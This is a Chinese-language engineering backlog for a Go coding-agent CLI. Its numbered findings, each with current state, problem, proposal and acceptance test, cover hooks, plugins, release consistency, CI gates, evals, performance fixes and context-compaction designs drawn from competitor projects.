- **问题**：Claude Code 兼容的 `{"permissionDecision":"deny"}` 被解析后静默丢弃，只有 exit 2 能拦截；allow 裁决永不生效；中间件链（审计/上下文改写）在生产完全不可用。
- **建议**：Dispatcher.Run 同步层级排空后用 `AggregateVerdict(VerdictFromOutcome(o)...)` 折入 Result（deny→Blocked，allow 仅 opt-in VerdictEnabled 下可解除非 exit-2 block，保持兼容）；app 注入一个内置 middleware（审计+补 session/cwd 进 Payload），opt-in 控制 StopBlocks。
- **验收**：fake runner 返回 exit 0 + `permissionDecision:deny`，断言工具未执行；`go test ./internal/hooks -run 'TestVerdictFromOutcome|TestDispatchVerdict|TestStopBlocks' -count=1`。

### 68. hooks 热重载原语（SnapshotFromSources/SnapshotStore）未接线 `[P2/M]`
- **现状**：`internal/hooks/reload.go:37,79` 的 `fingerprintSources`/`SnapshotFromSources`、`reload_wire.go:20,102` 的 `SnapshotStore`(Swap/NoteFailure/LastGood)/`ValidateBeforeAdopt` 全仓仅命中各自测试；`app/hooks.go:47 newHookBridge` 每次运行只 `loadHookDocuments` 一次，hookBridge 持有静态 config。
- **问题**：长会话（TUI/--rpc/daemon）修改钩子文档必须重启才生效；last-good 回退、指纹去重、采纳前纵深信任复核全部只测不用。
- **建议**：hookBridge 增 `store *SnapshotStore`/`sources []Source`/`trust *TrustStore` 与 `poll(ctx)`：周期调 SnapshotFromSources，changed 时先 ValidateBeforeAdopt 再 Swap，失败 NoteFailure 写 warn；fire 改用 store.Load().Config；轮询默认关闭保 golden。
- **验收**：`app/hook_reload_test.go` 注入 SourceFunc，改字节后 poll 一次断言 fire 用新命令且失败回退 last-good；`go test -race ./internal/app -run TestHookReload -count=1`。

### 69. 插件包管理 API 无 CLI 入口，marketplace 缺口 `[P1/M]`
- **现状**：`internal/plugins/install.go:32,41,116` 的 Install/InstallWith/Uninstall、`discovery.go:233,255` 的 SaveState/SetEnabled、`merge_preview.go:68 PreviewMerge` 除测试外零调用；`internal/cli/cli.go:152-196` 子命令表有 mcp/skills/commands/hooks 但无 plugin。
- **问题**：用户无法从终端安装/卸载/启停插件，也无法预览合并冲突；只能手工拷目录并改 state.json；声明式 bundle 对终端用户不可达。
- **建议**：新增 `internal/cli/plugin.go`：`plugin install <path|zip> [--force]`/`uninstall`/`list [--json]`/`enable|disable`/`preview [root]`，内部调上述库函数，目标目录取 UserPluginsDir()/ProjectPluginsDir(root)；list 复用 Discover+Validate 输出结构化 Problem；preview 渲染 PreviewMerge.Conflicts；同步 subcommandOrder 与 completion；marketplace 先定义「本地目录/zip + 清单 URL 列表」只读索引，不引依赖。
- **验收**：`internal/cli/plugin_test.go`：临时 zip 安装后 list 出现、disable 后 Enabled=false、uninstall 后目录消失；`TestSubcommandParity` 通过；`argentgo completion bash` 输出含 plugin。

### 70. 安装过程丢失可执行位，插件 MCP 脚本无法启动 `[P1/S]`
- **现状**：`internal/plugins/install.go:248 copyTree` 只 MkdirAll(0755)，`:287 copyFile` 用 os.Create（0666&umask）且从不 Chmod，`:196 copyZipEntry` 用 0644 丢弃 `entry.Mode()`；`:270` 跳过所有符号链接（安全正确但无诊断）；`manifest.go:439-444 Validate` 只检查 MCP 有 command/url 不检查可执行位；plugins 包无权限断言测试。
- **问题**：bundle 中作为 MCP command 的 `./server.sh`/`./bin/foo` 安装后丢失 +x，Linux/macOS 上 exec 直接 permission denied；叠加 #63 的 cwd 问题，插件 MCP 在 Unix 几乎无法可靠启动。
- **建议**：copyTree 在 copyFile 后 `os.Chmod(to, info.Mode().Perm())`；copyZipEntry 在 Close 后 `os.Chmod(target, entry.Mode().Perm() &^ 0o022)`（去组/其他写位防恶意 777）；Windows 跳过 chmod；跳过的符号链接通过 Bundle.Problems 报告；Validate 增加 command 为相对路径时的存在性/可执行位检查。
- **验收**：Linux 上 `go test ./internal/plugins -run 'TestInstallPreservesExecutableBit|TestZipEntryExecutableBit' -count=1`：0755 安装后 Mode()&0111≠0、0777 归档降为 0755；`GOOS=linux go build ./...`。

### 71. 清单 `tools` 字段被解析后完全丢弃 `[P2/S]`
- **现状**：`internal/plugins/manifest.go:75 Manifest.Tools []string` 由 :180 ParseManifest 从 raw.Tools 填充；`merge.go:22 Wiring` 只有 MCP/Skills/Commands/HooksPaths，`:42 Merge` 从不读 Tools；`validate_manifest.go:52` 不检查；app 的 wirePlugins/pluginCommandSources/pluginHookPaths 均无 tools 分支。
- **问题**：清单作者写 `tools:[...]` 后既无效果也无诊断，与「声明式 bundle」设计冲突，PreviewMerge 也不覆盖该字段。
- **建议**：二选一——A 有限支持：把 Tools 定义为「该插件技能的工具白名单」，Wiring 加 Tools（复用 `merge.go:95 appendResolved` 的逃逸防护），app 在 `addSkillPath`（app/mcp.go:538）写入 Skill.AllowedTools；B 明确拒绝：validate_manifest 新增 `IssueUnsupportedField` Kind，Tools 非空即报结构化告警并在 plugin list 展示。两方案都需在 merge_preview 增加对应 Contribution/Conflict 或在清单文档标注。
- **验收**：`go test ./internal/plugins -run 'TestManifestTools|TestValidateManifestUnsupportedTools' -count=1`。

### 72. 事件钩子常驻外部进程扩展 `[P2/L]`（学自 pi-mono ExtensionAPI）
- **竞品证据**：`pi-mono/packages/coding-agent/src/core/extensions/types.ts`（订阅生命周期事件、注册工具/命令/快捷键、UI 原语）、`runner.ts`、`event-bus.ts`。
- **现状/缺口**：`internal/plugins` 只做清单发现（贡献 skills/commands/MCP）无代码执行；`internal/hooks` 每次事件 fork 一个 shell 取 stdout；`internal/mcp` 只覆盖工具不覆盖生命周期事件决策（压缩前、缓存决策、模型切换）。
- **建议**：复用 `internal/server` 已有的 stdlib JSON-RPC/stdio 新增 `hookServer` 配置：一个常驻外部进程声明订阅事件列表，事件到达发 `event` 通知，可返回 `additionalContext`/`verdict`（沿用 exit-2 fail-closed 或 warn-only）；不引入 Go plugin（避免 cgo），单二进制与零依赖不变。
- **验收**：常驻进程一次会话只启动一次、收到 ≥3 类事件；verdict 能阻断工具且 stdout 不污染协议；进程崩溃后自动降级为无扩展主循环继续；默认无配置时字节不变。

### 73. `Spec.ToolCacheTTL`/`Spec.HealthTracking` 两字段 app 侧从未设置 `[P2/S]`
- **现状**：`internal/mcp/mcp.go:38-90 Spec` 定义 `ToolCacheTTL` 与 `HealthTracking`，前者仅 `ListTools`:303 在 >0 时启用 TTL 缓存，后者仅 :210 挂接 HealthTracker；`app/mcp.go:344-357 wirePlugins` 与 :363 connect 均不设置这两个字段（零值）。
- **问题**：TTL 缓存与健康追踪这两项已实现能力因配置未注入而全局禁用，与 #62/#65 的通知/输出缺口叠加后，MCP 运行时可观测性与效率双双为零。
- **建议**：在 app 的 MCP 配置解析/合并层为这两个字段提供显式来源（配置文件字段 + env 覆盖 + 合理默认），或至少经 opt-in 注册表暴露开关；注册进 `OPT_INS.md` 与漂移守卫，避免「有字段无来源」再次发生。
- **验收**：`grep -rn 'ToolCacheTTL\|HealthTracking' internal/app` 至少各 1 条生产赋值；`go test ./internal/mcp -run 'TestToolCache|TestHealthTracking' -count=1`。

---

## 七、工程纪律 / 测试 / CI / 发布（74–93）

### 74. 版本三处字面量已漂移，一致性脚本只校验 cli.go `[P0/S]`
- **现状**：`internal/cli/cli.go:27 const Version = "0.8.1"`；`internal/mcp/mcp.go:27 clientVersion = "0.7.0"`（用于 :248 clientInfo.version）；`internal/lsp/client.go:223` 硬编码 `"version":"0.7.0"`。`docs/USER_GUIDE.md:329-339` 要求三处同步，但 `scripts/check-release-consistency.ps1:13-30` 与 `build-release.ps1:41-58` 都只正则读 cli.go；全仓无版本一致性测试。
- **问题**：MCP/LSP 服务端看到的客户端版本落后两个版本，诊断与兼容矩阵失真；下次 bump 会继续漂移。
- **建议**：两处 0.7.0 改为当前版本；check-release-consistency.ps1 增加对 mcp.go/lsp/client.go 的同款正则扫描，任一不等即非零退出；新增 `internal/cli/version_consistency_test.go` 从相对路径读三个文件断言相等（仿 optin_docs_guard_test.go）。
- **验收**：`go test ./internal/cli -run TestVersionLiteralsConsistent` 绿，改任一文件成错值时失败；`powershell -File scripts/check-release-consistency.ps1 -Tag v0.8.1` 在三处不一致时非零退出。

### 75. 版本锚点 40w/50w 双口径冲突 `[P0/S]`
- **现状**：`AGENTS.md:128-129` 表格仍为 `40w→v0.8.2`、`50w→v0.8.3`；`:136` 注记说「用户 2026-11-21 明确 50w 行发 v0.8.2，覆盖原表格……发版时须同步调整表格」，但表格数字未改；`CHANGELOG.md:3-5` 已按 50w→v0.8.2 写；cli.Version=0.8.1。
- **问题**：到达 40w 时按表格应发 v0.8.2、按注记应等到 50w——发版决策双口径，可能提前或无限延后；consistency 脚本不校验行数阈值无法机器拦截。
- **建议**：统一到 50w→v0.8.2：改 AGENTS.md 表格（删 40w 行，50w 改 v0.8.2，后续 60w/70w 顺延 v0.8.3/v0.8.4）并删临时注记；CONTRIBUTING.md release checklist 增加行数核对步骤；check-release-consistency.ps1 加行数 warn（不硬失败）。
- **验收**：`grep -nE '40w|50w|0\.8\.2|0\.8\.3' AGENTS.md CHANGELOG.md CONTRIBUTING.md` 只呈现单一映射。

### 76. 源码证据评分文档失真：8.9 口径与 HEAD 引用同时过期 `[P0/M]`
- **现状**：`docs/STATUS.md:5` 仍称「8.9 分评估」，但 :93-94 最终表是等权 8.0/加权 8.85，:96 明写旧 8.9 已作废；`docs/CAPABILITY_MATRIX.md:9-11` 仍以「STATUS 的 8.9/10」开篇；HEAD 真值 `8881ed9`，但 CAPABILITY_MATRIX.md:5 称「取证基线 a30b0e4（当前 HEAD）」、STATUS.md:74 称「a30b0e4=355,578 行」、CHANGELOG.md:22 同为 a30b0e4 而 :3 又写「当前 HEAD 7dee8a1」；行号引用错位（CAPABILITY_MATRIX.md:78 引用 STATUS.md:57 论证 tree-sitter，实际该行是 go install 分发）。
- **问题**：两篇核心文档对外评分口径自相矛盾；所有「源码证据行号」以旧 commit 为基线却标称当前 HEAD，读者无法复核。
- **建议**：① STATUS.md:5 改「加权 8.85/等权 8.0」，CAPABILITY_MATRIX.md:9-11 同步，保留 :96 的「旧 8.9 作废」历史注记；② 三处 HEAD 表述改「取证 commit a30b0e4（可用 `git log -1 --format=%h -- docs/STATUS.md` 复核）」而非「当前 HEAD」，并抽样核对矩阵中的 STATUS 行号引用（重点 :57/:78/:84/:308）；③ 新增轻量文档守卫测试断言取证 commit 存在且抽样行号命中预期文本。
- **验收**：`grep -rn '8\.9\|a30b0e4\|7dee8a1' docs CHANGELOG.md` 中 8.9 仅剩一条作废注记、HEAD 仅一种口径；`go test ./internal/eval -run TestDocEvidenceAnchors` 绿。

### 77. `security-audit.ps1` 隐私白名单腐烂且脚本从未接入 CI `[P0/M]`
- **现状**：`scripts/security-audit.ps1:173-176` 白名单仅 2 项（`secret_test.go:sk-abc...`、`tools_security_scan_test.go:AKIA...`）；但 tracked 源码还有 `app/verify_wire_test.go:110 sk-abcdefghijklmnop1234`、`server/error_redact_test.go:20,22`、`server/config_info_test.go:63`、`server/rpc_redact_test.go:57`、`security/pending_test.go:205 ghp_...ABCD`、`session/export_test.go:13 AKIAFAKESECRETKEY1234`、`native/approval_answer_test.go:144` 等命中 :165-170 的正则。`.github/workflows` 无任何脚本调用该文件；`privacy-scan.ps1:32-40` 另有一套 7 项白名单，双实现漂移。
- **问题**：脚本按设计「任何失败非零退出」，按当前树必然报 `privacy scan found N potential secret(s)`；正因从未运行腐烂无人发现，安全审计实际零覆盖，一旦有人好心接入 CI 会立刻全红。
- **建议**：把 security-audit 的 $allow 改造为复用 privacy-scan 的公开示例值集合，更好的是抽 `scripts/lib/secret-fixtures.ps1` 由两脚本 dot-source 消除双实现；在 matrix.yml 新增 security job 运行该脚本，并显式装 govulncheck 使软失败变硬。
- **验收**：`pwsh -File scripts/security-audit.ps1` 退出 0 且打印 `SECURITY AUDIT PASSED`；`grep -n security-audit .github/workflows/*.yml` 至少一条；新增未登记合成 token 后脚本非零退出。

### 78. `matrix.yml` 只在 PR 触发，直推 main 与 tag 发布绕过架构守卫和 5 平台交叉编译 `[P1/S]`
- **现状**：`matrix.yml:19-21 on: pull_request/workflow_dispatch`（注释明确「特意不按 tag 触发」）；`ci.yml:6-9` 只有 push main/master + PR；`release.yml:15-17` 只 tag；`CONTRIBUTING.md:188` 自称三个触发条件互不重叠。archguard 唯一运行点在 matrix.yml:102-112，5 目标 crossbuild 在 :32-60。
- **问题**：维护者直接 push main/master 时 archguard、darwin/arm64 等 5 目标 no-cgo 构建、no-cgo 单测全部跳过；带分层违规或 darwin 专属 cgo 依赖的提交可在「全绿」状态下进入主分支并被 tag 发布。
- **建议**：给 matrix.yml 的 on 增加 `push: branches:[main,master]`（与 ci.yml 一致），保留不按 tag 触发的注释但改说明；在 release.yml 的 verify job 加一步 `go test ./internal/archguard -count=1`，让发布 tag 自带架构门禁。
- **验收**：push 后 `gh run list --workflow=matrix.yml` 出现对应 run；release verify 日志含 `go test ./internal/archguard`；test-release-workflow.ps1 扩展静态断言 `release calls archguard`。

### 79. archguard 漏扫 `cmd/`，且分层规则对子目录用精确匹配可绕过 `[P1/M]`
- **现状**：`internal/archguard/arch_test.go:64` 只 `goFiles(t, filepath.Join(root,"internal"))`、:99 只 native/，`cmd/argent/main.go`/`gui.go` 从未解析；`:89` 判定用 `pkgDir == r.pkgRel` 精确相等；AGENTS.md:86 明示不查 import 环，matrix.yml:112 的 job 只跑该测试不编译任何包。
- **问题**：cmd/argent 若 import 第三方或 "C" archguard 全绿；新增 `internal/tools/foo/bar.go` import internal/agent 时 pkgDir="internal/tools/foo"≠"internal/tools"，6 条规则全失效；import 环只能靠其他 job 兜底，archguard job 单独跑给虚假安全感。
- **建议**：goFiles 改为覆盖仓库根下全部 .go（跳过 .git/dist/临时目录），cmd/ 应用同款 stdlib-only+禁 cgo；:89 改 `pkgDir == r.pkgRel || strings.HasPrefix(pkgDir, r.pkgRel+"/")`；测试末尾增加基于 importPaths 的模块内 import 图 DFS 环检测（遇环 t.Errorf）。
- **验收**：临时新增 `internal/tools/x/y.go` import internal/agent 后 `go test ./internal/archguard` 必须失败；临时给 cmd/argent/gui.go 加 `import "C"` 后同命令必须失败（仅静态验证勿提交）。

### 80. 25 个 Benchmark 的断言在 CI 中从不执行 `[P1/S]`
- **现状**：`.github/workflows/ci.yml:45-46` 只跑 `go test ./...` 无 `-bench`（grep bench 无命中），Go 默认不执行 Benchmark；正确性断言位于 `internal/session/session_bench_test.go:115,136,162` 的 b.Fatalf、`internal/tui/tui_bench_test.go:25`、`tools_bench_test.go:164,167,186`；三个 workflow 与全部 .ps1 中 `grep -bench` 命中 0；`AGENTS.md:28` 声称「断言在 go test 下运行」与 Go 语义不符。
- **问题**：记录数契约、夹具完整性、热路径行为回归（尤其 #94 的分配回归）无人把关；文档承诺的「过时断言会让构建失败」不成立。
- **建议**：ci.yml go job 加 `go test -bench . -benchtime=1x ./internal/agent ./internal/session ./internal/tools ./internal/tui`（1x 足够触发断言不计时）；AGENTS.md:28 表述改为准确描述；长期把正确性断言抽成普通 TestXxx，bench 只测性能。
- **验收**：`grep -n -- '-bench' .github/workflows/*.yml` 非空；把 session_bench_test.go:114 的 `n+1` 改为 `n` 后该命令必须失败。

### 83. 三处 race 门禁中两处无 `-timeout`，挂起会耗尽 6 小时 job 上限 `[P1/S]`
- **现状**：`ci.yml:81`、`release.yml:100` 的 `go test -race ...` 无 timeout，只有 matrix.yml:97 带 `-timeout 20m`；ci.yml 的 race job 在 ubuntu-latest 上还包含 native 包（`go list ./...` 未过滤），与 AGENTS.md「native 偶发 GPU 挂起」风险叠加。
- **问题**：一旦死锁/长时间阻塞，release tag 流水线的 race 门禁最长挂到 GitHub 默认 6 小时才失败，阻塞发布且浪费 runner；三处命令形式漂移增加维护成本。
- **建议**：给两处补 `-timeout 20m`，把三处命令抽成 `.github/workflows/_race.sh` 或 reusable workflow 杜绝漂移；复核是否需要再排除 ./native（若在 Linux 确需排除，三处同步并注明 Windows 的 ci.yml go job 已覆盖 native 测试）。
- **验收**：`grep -n -- 'go test -race' .github/workflows/*.yml` 三处均含 -timeout；test-release-workflow.ps1 新增静态断言 `race job pins -timeout`；用临时 `select{}` + 短超时验证门禁会失败。

### 88. `eval compare`/`eval ab` 的输入 Result 向量没有生成器，测量闭环断档 `[P1/M]`
- **现状**：`internal/cli/eval.go:29-41,202-302` 实现 compare/ab 分派，`loadResultVector`:234-253 只读 `<baseline-results.json>`；默认路径（:111-129）只打印 `ok N/...` 文本；`internal/eval/run.go:69-91` 已定义带 json tag 的 `Result`/`Report` 却无任何 CLI 落盘；`quality_report.go:7` 明写「不接线到 CLI」；USER_GUIDE.md:240-250 只说「读取两份结果文件」未交代来源。
- **问题**：STATUS.md:116 与 CAPABILITY_MATRIX.md:329 宣称「测量闭环」，但用户无法从 eval 自身得到 compare/ab 输入，必须手写 JSON 或临时改代码——工具存在但最后一公里未接通。
- **建议**：给 eval 增加带外前缀 `--json <path>`（或 `eval export --out`），复用 run.go 的 Report 把 Results 序列化为与 loadResultVector 对齐的 `{"results":[...]}`；--live 路径同样支持落盘；evalUsage 补用法，USER_GUIDE §9 加「导出→compare→ab」完整示例。
- **验收**：`argentgo eval --json out.json evals/core.json && argentgo eval compare out.json out.json` 退出 0；新增 `internal/cli/eval_json_test.go` 断言导出文件可被 loadResultVector 解析且 len(results)==11。

### 89. 编排评测 `RunOrchestration` 只在 Go 测试里跑，CLI 无入口 `[P1/M]`
- **现状**：`internal/eval/orchestration.go:146-186` 提供 Load/Parse，:398-426 提供 `RunOrchestration`；`evals/orchestration.json` 含 10 场景（persona 委派、verify 重试上限、后台结果注入、TaskBoard、深度限制，断言种类见 :584-635）；调用点仅 orchestration_test.go:12/24 与 orchestration_extra_test.go:45/108/141；`cli/eval.go:23-50` 分派只有 compare/ab/--live/默认。
- **问题**：覆盖 agent 委派正确性最强的 eval 无法作为发版门禁命令运行，也无法产出可对比结果；与 core.json 走 CLI 的待遇不一致。
- **建议**：cli/eval.go 按 compare/ab 同风格加带外前缀 orchestration，定义窄接口 `OrchestrationRunner` 由 app 注入；输出 Total/Passed/Failed 与每条 `OrchestrationFailure{ID,Name,Reason}`（结构已在 :130-144）；任一失败退出非 0；STATUS.md:43 门禁改为同时跑 core 与 orchestration。
- **验收**：`argentgo eval orchestration evals/orchestration.json` 输出 10/10 退出 0；注入失败场景副本时退出非 0 并打印 Reason；`--help` 含新用法。

### 91. `core.json` 场景数文档写 10、代码断言 11 `[P1/S]`
- **现状**：`internal/eval/eval_test.go:233-249` 断言 want 11、report.Passed!=11、输出含 `"1..11"`；`evals/core.json` 实际 11 场景（第 11 个是 286-316 行 approval denial）；但 `docs/CAPABILITY_MATRIX.md:209`、`:274`、`:287` 三处均写「10 个脚本场景」/「core.json（10 场景）」/「core.json 10 场景」。
- **问题**：用户按文档找「第 10 个场景」会错位；发版门禁实际跑 11 个，对外评测规模口径失真。
- **建议**：三处 10 改 11；参照 OPT_INS.md:5 的双向守卫范式新增 `internal/eval/core_docs_guard_test.go`——从 core.json 读场景数，正则核对 CAPABILITY_MATRIX.md 中的数字，防再次漂移。
- **验收**：`grep -n '10 场景\|10 个脚本场景\|core.json 10' docs` 无命中；`go test ./internal/eval -run TestCoreDocsGuard` 绿，临时加一场景时守卫失败。

### 93. 首次启动引导缺失，`cli_hints` 原语空挂 `[P2/M]`
- **现状**：`USER_GUIDE.md:159-160` 注明「不带 prompt 的 argentgo 会读 stdin 然后退出，不会自动打开 TUI」；README.md:68-78 快速开始直接假设已配 key；login/doctor 命令已存在，错误提示会引导 login，但无首次运行检测标记；`cli_hints` opt-in 键仅在 `config/optin_config.go:40` 注册、OPT_INS.md:100 列出，无任何行为消费点。
- **问题**：新用户按 README 装完，无参数运行读到空 stdin 立即退出，屏幕一闪而过且无「先 login / 用 tui / 跑 doctor」指引；#92 修好安装验证后下一步仍卡首次启动。
- **建议**：在 `cli/cli.go` 无参数分支加一次性引导：stdin 为字符设备（os.Stdin.Stat() 检查 ModeCharDevice，零依赖）且无配置/无凭据时，向 IO.Err 打印三行（login 示例、tui/gui 入口、doctor 自检），并在 storage 目录写 onboarded 标记；复用 cli_hints 键作开关（默认关保持逐字节不变）；USER_GUIDE §3 与 OPT_INS.md 同步。
- **验收**：`internal/cli/first_run_guide_test.go`：临时 StorageDir + 空 stdin 两例——无配置输出含 login/tui/doctor，预置带 key 配置时逐字节一致；不设 ARGENT_OPT_INS=cli_hints 时按原行为退出。

---

## 八、性能 / 资源 / 可观测（94–99）

### 94. `tokenize.Estimate` 在 ASCII 热路径引入全量 SHA-256 与切片分配 `[P0/S]`
- **现状**：`internal/tokenize/tokenize.go:20-32 Estimate` 先 `key := hashContent(text)` 再查 LRU，`cache.go:47-49 hashContent` 为 `sha256.Sum256([]byte(text))`；而 `estimateUncached`:38-46 的 ASCII 快速路径只需逐字节扫描；`agent/trim.go:39-58 EstimateTokens/EstimateMessages` 每次请求调用多次。
- **问题**：原本 O(n) 的 ASCII 估算现在对整段 40KB 工具输出做 `[]byte(text)` 全量拷贝 + SHA-256，分配和 CPU 反高于省下的扫描——被 `BenchmarkEstimateTokens` 直接覆盖的最热路径，属「优化引入的回归」。
- **建议**：`Estimate` 先做无分配 ASCII 探测，纯 ASCII 直接返回 `(len(text)+3)/4`，完全跳过 hashContent/sharedCache；仅非 ASCII 走缓存。或改基于长度+首尾采样的无分配键（碰撞时回退全文比对，现有 get:61 已比对）。
- **验收**：`TestEstimateASCIIHasZeroAllocs`（testing.AllocsPerRun 对 strings.Repeat("abc",10000) 断言 0）；`go test -bench=BenchmarkEstimateTokens -benchtime=200x ./internal/agent -count=1` 对比 ascii-1KB 子基准 ns/op 与 B/op 必须下降。

### 95. checkpoint 哈希缓存无界增长，保存完整文件字节 `[P1/M]`
- **现状**：`internal/session/checkpoint.go:64-67` 包级 `checkpointHashCache.entries map[hashCacheKey]hashCacheEntry`，`:59-62 hashCacheEntry.before []byte` 存完整文件字节，`:82-87 rememberCheckpointHash` 每次 miss 都写，无容量/TTL/淘汰；key 含 mtime（:155）同一文件每次编辑产生新条目；仅有全清 :92 与按路径 :101，无自动调用点。对照 `tokenize/cache.go:11` 明确设 cacheCapacity=512。
- **问题**：长会话中每个被编辑过的文件版本永久驻留内存，编辑循环让缓存随轮次线性增长——真实内存泄漏风险。
- **建议**：增加 FIFO/LRU 上限（复用 container/list，参考 tokenize/cache.go:25-97），建议 64 条或按累计字节（32MiB）双阈值淘汰，在 rememberCheckpointHash 写入时淘汰；invalidated 路径同时清字节。
- **验收**：`TestCheckpointHashCacheEvictsOldest`：连续插 100 个不同 mtime key 后条目数不超上限且命中仍正确；`go test ./internal/session -run 'TestCheckpointHashCache|TestCaptureCheckpointHashCache' -count=1`。

### 96. `MeasureDiskUsage` 全量收集 + 全局排序是零收益开销 `[P1/S]`
- **现状**：`internal/session/disk_usage.go:66` 声明 `var files []regularFile`，:90 对每个普通文件 append，:98 `sort.Slice`，:99-106 累加 ByKind/Bytes/Files；累加用 :131-136 `clampAddInt64`（饱和加法满足交换律结合律），Files 为单调计数，注释 :34-37 宣称的「遍历次序无关」由饱和加法本身即可保证。
- **问题**：大 sessions 目录（成千上万 .jsonl）带来 O(n) 额外内存 + O(n log n) 排序，而 `cli/doctor.go:354` 与 `cli/sessions.go:299` 每次都要付；排序对最终结果无任何影响。
- **建议**：删除 regularFile 切片与 sort.Slice，在 filepath.WalkDir 回调内直接按 diskUsageKind(path) 累加三个量（保留 Lstat、符号链接跳过、size<0 钳零、溢出钳制全部语义）；改写 :34-37 与 :97 注释说明「饱和加法可交换故无需排序」。
- **验收**：`TestMeasureDiskUsageOrderIndependentWithoutSort`：同一组文件不同遍历顺序比较 DiskUsage 完全相等；现有 disk_usage_test.go:35-293 全绿；新增 benchmark 断言 B/op 不随文件数线性增长。

### 97. 输出落盘默认关闭，清理只按时间、无磁盘容量上限 `[P1/M]`
- **现状**：`internal/app/output_spill_wire.go:70-72` 在 ARGENT_OUTPUT_SPILL 未设置时直接返回原 ctx（默认禁用），:85 只在启用时做一次 CleanSpillArtifacts；`tools/output_spill_retention.go:13 DefaultSpillRetention=7*24h`、:29-53 仅按 mtime 删除无总字节阈值；`output_spill.go:257-294 writeSpillArtifact` 每次 O_EXCL 新建无容量反馈；`output_spill.go:14-16` 注释仍写「尚未接入工具执行循环」与 tools_clip.go:13 的实际接线矛盾。
- **问题**：默认路径下超 40KB 的工具输出直接 clip 且丢失字节不可恢复；启用后短时间大量大输出在 7 天内持续占用 artifacts，无容量闸门，批量任务可打满磁盘；陈旧注释误导维护者。
- **建议**：① 更新 output_spill.go:14-16 注释。② 给 CleanSpillArtifacts 加可选 maxBytes（或新增 TrimSpillArtifacts(dir,maxBytes)），按 mtime 升序累计超限即删，返回 removed/freed；configureOutputSpill 读新 env ARGENT_OUTPUT_SPILL_MAX_BYTES（默认 512MiB）并调用。③ writeSpillArtifact 写前用目录累计大小快检，超限退化为不带链接的截断（formatSpillMarker(omitted,"")，:245 已支持）。
- **验收**：`TestTrimSpillArtifactsByTotalBytes`（造 10 小工件 + 上限断言 oldest 被删）；`TestDefaultSpillDisabledAndEnabled`（env 两路径产物有无符合预期）。

### 98. `mcp.ringBuffer` 用连续切片滑动，每次小写入最多 memmove 8KB `[P2/S]`
- **现状**：`internal/mcp/ring.go:9-13 ringBuffer{buf []byte,limit int}`，stderrRingBytes=8KB，Write:34-46 扩容后 `copy(r.buf, r.buf[drop:])`（:42）整体左移再 append，String:49-53 每次 string(r.buf) 全量复制；已接线于 stdio.go:105/144（子进程 stderr 诊断）。
- **问题**：MCP 子进程高频输出 stderr（构建/测试类 server 常见）时每次写入触发 O(limit) memmove 与潜在扩容复制；虽 8KB 不大但纯属可消除成本，且 ring_test.go 当前不存在（缺测试）。
- **建议**：buf 改固定容量真环形（加 start/n 字段），Write 对 p 尾切片两次 copy 环回覆盖消除滑动；String 用两次拼接避免中间拷贝或提供 Bytes()；保留单次大写入只留尾部 limit 字节语义。
- **验收**：补齐 ring_test.go：超大写入只留尾部、小写入后 String 与朴素模型一致、并发 Write/String 无竞态；`go test -race ./internal/mcp -count=1`；新增 BenchmarkRingWrite 断言稳态 B/op==0。

### 99. `utf8CarryWriter` 每次携带暂存字节的 Write 都重新分配 `[P2/S]`
- **现状**：`internal/proc/utf8_writer.go:28-33 utf8CarryWriter{carry []byte}`；Write:66-112 在 len(carry)>0 时 :78 `data = make([]byte,0,len(carry)+n)` 并两次 append，随后 :87-94 逐 rune `utf8.FullRune`+`utf8.DecodeRune` 双次解码；中文/emoji 输出被切分时每次分块都走该分支。
- **问题**：携带续字节的中文流（每行都可能）每次写产生与分块等大的新切片（GC 压力）；逐 rune 双解码是重复工作。
- **建议**：加可复用 `scratch []byte` 字段，`Write` 用 `scratch = append(scratch[:0], carry...); scratch = append(scratch, p...)` 避免 make（仅容量不足时增长）；:87-94 改单次 DecodeRune + size==1&&r==RuneError 边界判断（保持无效字节按宽度 1 通过语义）；保留 mu 串行化与畸形尾部防御上限。
- **验收**：`go test ./internal/proc -run 'TestUTF8|TestDetachedUTF8' -count=1` 与 `-race` 全绿；新增 BenchmarkUTF8CarryWriterChunked 断言稳态 B/op 下降且输出逐字节一致。

---

## 九、竞品源码深读新增（101–135）

### 104. 上下文计量：provider 实测锚点 + 文本估算 + 预留余量 + 溢出逐级缩减 `[P1/M]`（opencode + cline + pi）
- **竞品证据**：`opencode/packages/core/src/session/compaction.ts:55-56` 把大小拆成 `measured`（provider 报告的锚点）与 `estimated`（其后新增文本）；`:1120-1144` 用最近同模型、无错的 assistant 的 input+cache+output 作 measured 基线，只估未计量尾部；`:123-136,1151-1159` 的 `RESERVE_SHARE=0.15`/`RESERVE_MIN=16000` 算 ceiling；`:122-124,668-682` 溢出后按 `SHRINK_STEPS=[0.85,0.7,0.5,0.35]` 缩减。`cline/sdk/packages/core/src/extensions/context/compaction.ts:344-368` 用 `underestimateFactor=min(4,max(1,actualPreviousInputTokens/requestInputTokens))` 自适应缩放。`pi-mono/packages/coding-agent/src/core/agent-session.ts:3121-3250` 区分溢出可重试 / 成功但超限 / 阈值三种情形。
- **argentgo 现状**：`internal/agent/trim.go:13-71` 的 `EstimateMessages/EstimateTools` 是纯字符/4 启发式（含缓存保护阈值 `:22-24`）；`internal/app/compact.go:124-132` 有 `usageAnchor` 做原生 totalTokens 前缀锚点，但阈值比较（`:82-88`）仍用固定 `InflateEstimate` 1.3 倍（`internal/agent/budget.go:152-158`），没有「实测/估算」比率自适应；触发后也没有逐级缩减重发。
- **问题**：本地模型/大工具输出场景下估算误差大，可能过早压缩（浪费缓存）或过晚触发（撞硬限制）。
- **建议**：opt-in 地在 `estimateContextTokens` 记录 `requestInputTokens`，用有上限的系数收缩/放宽阈值；把 `RESERVE_SHARE` 风格余量纳入阈值计算；溢出重试复用 `SHRINK_STEPS` 式逐级重发（但受 `MaxCompactRetries` 约束）。默认路径保持 chars/4 × 1.3 不变。
- **验收**：表驱动测试喂「实测 120k / 估算 60k」断言系数钳到 4、阈值按新公式变化；基线用例断言 opt-in 关闭时阈值逐字节不变；`go test ./internal/agent ./internal/app -count=1`。

### 105. 后台预压缩：提前写摘要、到阈值直接切换 `[P1/L]`（opencode + codex）
- **竞品证据**：`opencode/packages/core/src/session/compaction.ts:338-402`：`PRECOMPUTE_LEAD=60_000`，在距上限还有 60k token 时 fork 后台摘要，锚定最近 provider 已计量的 assistant（`:360-366`），受 cache TTL（`:369-386`，过期/换模型/连续失败 2 次则取消）约束；摘要**只持有不立即应用**（`:340-343`，避免改写缓存前缀），`:404-428` 在阈值处校验 tail 后 swap。`codex/codex-rs/core/src/session/async_compaction.rs:34-110` 的 `maybe_start` 有类似的 history_version/模型/auth 一致性检查。
